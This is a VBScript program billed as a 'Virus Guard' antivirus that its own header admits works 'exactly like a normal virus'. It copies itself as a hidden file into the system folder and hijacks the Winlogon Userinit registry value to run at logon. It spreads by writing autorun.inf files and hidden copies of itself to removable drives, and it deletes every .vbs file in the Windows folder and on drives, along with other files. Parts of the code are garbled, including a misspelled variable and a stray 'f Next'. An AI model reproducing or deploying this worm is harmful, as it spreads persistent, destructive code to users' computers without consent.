'******************************************************************
'********************* Virus Guard VBScript *********************
'************************** Version 1.00 **************************
'******************************************************************
'This antivirus program is intended to repair your computer from
'any sorts of virus attacks.
'This program is exactly like a normal virus but it repairs things
'rather than destroying them.
'******************************************************************
'******************************************************************
'Program developed by
'Dipak Bhattarai
'mero_dipak@yahoo.com
Option Explicit
On Error Resume Next

Dim Fso,Shells,SystemDir,WinDir,Count,File,Drv,Drives,InDrive,ReadAll,AllFile,WriteAll,Del,Chg,folder,files,Delete,auto,root

Set Fso = CreateObject("Scripting.FileSystemObject")
Set Shells = CreateObject("Wscript.Shell")
Set WinDir = Fso.GetSpecialFolder(0)
Set SystemDir =Fso.GetSpecialFolder(1)
Set File = Fso.GetFile(WScript.ScriptFullName)
Set Drv = File.Drive
Set InDrive = Fso.drives
Set ReadAll = File.OpenAsTextStream(1,-2)
do while not ReadAll.atendofstream
AllFile = AllFile & ReadAll.readline
AllFile = AllFile & vbcrlf
Loop


Count=Drv.DriveType

Do 
	If Not Fso.FileExists(SystemDir & "\VirusGuard.vbs") then
		set WriteAll = Fso.CreateTextFile(SystemDir & "\VirusGuard.vbs",2,true)
		WriteAll.Write AllFile 
		WriteAll.close
		set WriteAll = Fso.GetFile(SystemDir & "\VirusGuard.vbs")
		WriteAll.Attributes = -1
	End If

	Shells.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title","Dipak Bhattarai"
	Shells.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions","0","REG_DWORD"
	Shells.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr","0","REG_DWORD"
	Shells.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","0","REG_DWORD"
	Shells.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.google.com"
	Shells.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell","explorer.exe"
	Shells.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",SystemDir & "\userinit.exe," & _
	SystemDir & "\wscript.exe " & SystemDir & "\VirusGuard.vbs"

	For Each Drives In InDrive 
		root = Drives.Path & "\"
		If Fso.GetParentFolderName(WScript.ScriptFullName)=root Then
			Shells.Run "explorer.exe " & root
		End If
		Set folder=Fso.GetFolder(root)
		Set Delete = Fso.DeleteFile(SystemDir & "\killvbs.vbs",true)
		For Each files In folder.Files
			auto=Left(files.Name,7)
			If UCase(auto)=UCase("autorun") Then
				Set Delete = Fso.DeleteFile(root & files.Name,true)
			End If	
		Next
		If Drives.DriveType=2 Then
			delext "inf",Drives.Path & "\"
			delext "INF",Drives.Path & "\"
		End if  

		If Drives.DriveType = 1 Or Drives.DriveType = 2 Then
			If Drives.Path<> "A:" Then
				delext "vbs",WinDir & "\"
				delext "vbs",Drives.Path  & "\"
				
				If Fso.FileExists(Drives.Path & "\ravmon.exe") Then
					Fso.DeleteFile(Drives.Path & "\ravmon.exe")
				End If
				If Fso.FileExists(Drives.Path & "\sxs.exe") Then
					Fso.DeleteFile(Drives.Path & "\sxs.exe")
				End If
				If Fso.FileExists(Drives.Path & "\winfile.exe") Then
					Fso.DeleteFile(Drives.Path & "\winfile.exe")
				End If
				If Fso.FileExists(Drives.Path & "\run.wsh") Then
					Fso.DeleteFile(Drives.Path & "\run.wsh")
				End If
				If Fso.FileExists(Drives.Path & "\setup.exe") Then
					Fso.DeleteFile(Drives.Path & "\setup.exe")
				End If
				
				If Drives.DriveType = 1 Then
					If Drives.Path<>"A:" Then
						If Not Fso.FileExists(Drives.Path & "\VirusGuard.vbs") Then
							Set WriteAll=Fso.CreateTextFile(Drives.Path & "\VirusGuard.vbs",2,True)
							WriteAll.Write AllFile
							WriteAll.Close
							Set WriteAll = Fso.GetFile(Drives.Path & "\VirusGuard.vbs")
							WriteAll.Attributes = -1
						End If
				 
						If Fso.FileExists(Drives.Path & "\autorun.inf") Or Fso.FileExists(Drives.Path & "\AUTORUN.INF") Then 
							Set Chg = Fso.GetFile(Drives.Path & "\autorun.inf")
							Chg.Attributes = -8
							Set WriteAll = Fso.CreateTextFile(Drives.Path & "\autorun.inf",2,True)
							WriteAll.writeline "[autorun]"
							WriteAll.WriteLine "open=wscript.exe VirusGuard.vbs"
							WriteAll.WriteLine "shell\open=Open"
							WriteAll.WriteLine "shell\open\Command=wscript.exe VirusGuard.vbs"
							WriteAll.Close
							Set WriteAll = Fso.GetFile(Drives.Path & "\autorun.inf")
							WriteAll.Attributes = -1
						else
							Set WriteAll = Fso.CreateTextFile(Drives.Path & "\autorun.inf",2,True)
							WriteAll.writeline "[autorun]"
							WriteAll.WriteLine "open=wscript.exe VirusGuard.vbs"
							WriteAll.WriteLine "shell\open=Open"
							WriteAll.WriteLine "shell\open\Command=wscript.exe VirusGuard.vbs"
							WriteAll.Close
							Set WriteAll = Fso.GetFile(Drives.Path & "\autorun.inf")
							WriteAll.Attributes = -1
						End if
					End If
				End If
			End if  
		End If
	Next

	if Count <> 1 then
	Wscript.sleep 10000
	end if
loop while Count<>1

sub delext(File2Find, SrchPath)
   Dim oFileSys, oFolder, oFile,Cut,Delete
   Set oFileSys = CreateObject("Scripting.FileSystemObject")
   Set oFolder = oFileSys.GetFolder(SrchPatJ)
   For Each oFile In oFolder.Files
		Cut=Right(oFile.Name,3)
		If UCase(Cut)=UCase(file2find) Then
			If oFile.Name <> "VirusGuard.vbs" Then Set Delete = oFileSys.DeleteFile(srchpath & oFile.Name,true)
		End If
f Next
End sub


